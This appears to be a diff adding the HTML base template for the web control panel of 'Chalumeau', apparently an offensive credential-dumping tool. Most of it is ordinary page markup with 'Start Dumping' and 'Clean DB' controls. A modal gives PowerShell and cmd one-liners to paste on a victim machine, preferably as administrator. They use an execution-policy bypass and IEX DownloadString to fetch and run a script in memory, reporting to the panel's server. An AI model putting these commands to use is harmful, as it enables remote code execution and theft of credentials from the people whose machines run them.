@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+{% load static %}
+<head>
+  <!-- Meta Tags -->
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="wazehell @cyberstruggle delta group" />
+  <!-- Page Title -->
+  <title>Chalumeau | {% block page_title %}Home{% endblock page_title %}</title>
+  <!-- Plugins css -->
+  <!-- {% static '' %} -->
+  <link rel="stylesheet" type="text/css" href="{% static 'assets/css/bootstrap.min.css' %}" />
+  <link rel="stylesheet" type="text/css" href="{% static 'assets/css/font-awesome.min.css' %}" />
+  <link rel="stylesheet" type="text/css" href="{% static 'assets/css/material-icons.css' %}">
+  <link rel="stylesheet" type="text/css" href="{% static 'assets/css/jquery-ui.css' %}" />
+  <link id="mode-option" rel="stylesheet" type="text/css" href="{% static 'assets/css/dark-style.css' %}" />
+</head>
+{% block body %}
+<body>
+  <div class="tb-height-b60 tb-height-lg-b60"></div>
+  <header class="tb-header tb-style1 tb-sticky-menu">
+    <div class="tb-main-header">
+      <div class="tb-main-header-in">
+        <div class="tb-main-header-left">
+          <a href="/" class="tb-logo-link tb-dark-logo"><img style="width: 40px;" src="{% static 'assets/img/logo.png' %}" alt="logo-dark" /></a>
+
+        </div>
+        <div class="tb-main-header-right">
+          <div class="tb-nav-wrap tb-fade-up">
+            <div class="tb-nav-toggle">
+              <i class="material-icons-outlined">more_vert</i>
+            </div>
+            <nav class="tb-nav tb-desktop-nav">
+              <ul class="tb-nav-list">
+
+                <li class="tb-has-children">
+                  <a href="{% url 'web:delete_db_view' %}" class="btn btn-danger btn-lg">Clean DB</a>
+                </li>
+                <li class="tb-has-children">
+                  <button type="button" class="btn btn-success btn" data-toggle="modal" data-target=".bd-example-modal-lg">Start Dumping</button>
+                </li>
+              </ul>
+            </nav>
+            <!-- .tb-nav -->
+          </div>
+
+          
+        </div>
+
+        <div class="tb-main-header-left">
+          <div class="tb-nav-wrap tb-fade-up">
+            <div class="tb-nav-toggle">
+              <i class="material-icons-outlined">more_vert</i>
+            </div>
+            <nav class="tb-nav tb-desktop-nav">
+              <ul class="tb-nav-list">
+
+                <li class="tb-has-children">
+                  <a href="{% url 'web:logout_view' %}" class="btn btn-danger btn-lg">Logout</a>
+                </li>
+
+              </ul>
+            </nav>
+            <!-- .tb-nav -->
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header><!-- .tb-header -->
+  <!-- .tb-header -->
+  <div class="tb-sidebarheader-toggle">
+    <div class="tb-button-bar1"></div>
+    <div class="tb-button-bar2"></div>
+    <div class="tb-button-bar3"></div>
+  </div>
+  <!-- .tb-sidebarheader-toggle -->
+
+  
+  <div class="tb-sidebarheader">
+    <div class="tb-sidebarheader-in" data-scrollbar>
+      <div class="tb-sidebar-nav">
+        {% include "inc/nav.html" %}
+      </div>
+    </div>
+  </div><!-- .tb-sidebarheader -->
+  <div class="tb-content tb-style1">
+    <div class="tb-height-b30 tb-height-lg-b30"></div>
+    <div class="container-fluid">
+        {% block content %}{% endblock content %}
+    </div>
+    <!-- .container-fluid -->
+    <div class="tb-height-b60 tb-height-lg-b60"></div>
+    <div class="tb-footer tb-style1">
+      <div class="container-fluid">
+        <div class="tb-footer-content">
+          <div class="tb-copyride">
+            Made with love by <a href="#">wazehell</a> at
+            <a href="https://cyberstruggle.org/">CyberStruggle Delta Group</a> © All rights reserved.
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+
+
+
+  <div class="modal fade bd-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h4 class="modal-title" id="myLargeModalLabel">Execute Powershell Command</h4>
+          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+            <span aria-hidden="true">×</span>
+          </button>
+        </div>
+        <div class="modal-body">
+          <p>drop the following command into yourshell (better with administrative privileges) !</p>
+          <div class="form-group">
+            <label for="exampleInputPassword1">Powershell Command</label>
+            <input class="form-control" type="text" value="IEX(New-Object Net.Webclient).DownloadString(&#x27;{{ request.scheme }}://{{ request.get_host }}{% url 'web:get_invoker_view' %}&#x27;);Invoke-Chalumeau -ChalumeauServer &#x27;{% if request.is_secure %}https://{% else %}http://{% endif %}{{ request.get_host }}'" readonly>
+          </div>
+          <div class="form-group">
+            <label for="exampleInputPassword1">Cmd Command</label>
+            <input class="form-control" type="text" value="powershell.exe -exec Bypass -C &#x22;IEX(New-Object Net.Webclient).DownloadString(&#x27;{{ request.scheme }}://{{ request.get_host }}{% url 'web:get_invoker_view' %}&#x27;);Invoke-Chalumeau -ChalumeauServer &#x27;{% if request.is_secure %}https://{% else %}http://{% endif %}{{ request.get_host }}&#x27;&#x22;" readonly>
+          </div>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+
+
+
+  <!-- Scripts -->
+  <script src="{% static 'assets/js/vendor/modernizr-3.5.0.min.js' %}"></script>
+  <script src="{% static 'assets/js/vendor/jquery-1.12.4.min.js' %}"></script>
+  <script src="{% static 'assets/js/bootstrap.bundle.min.js' %}"></script>
+  <script src="{% static 'assets/js/bootstrap.min.js' %}"></script>
+  <script src="{% static 'assets/js/Chart.min.js' %}"></script>
+  <script src="{% static 'assets/js/chartjs.dark.js' %}"></script>
+  <script src="{% static 'assets/js/smooth-scrollbar.js' %}"></script>
+  <script src="{% static 'assets/js/main.js' %}"></script>
+
+  <script>
+
+
+  </script>
+
+
+</body>
+{% endblock body %}
+</html>
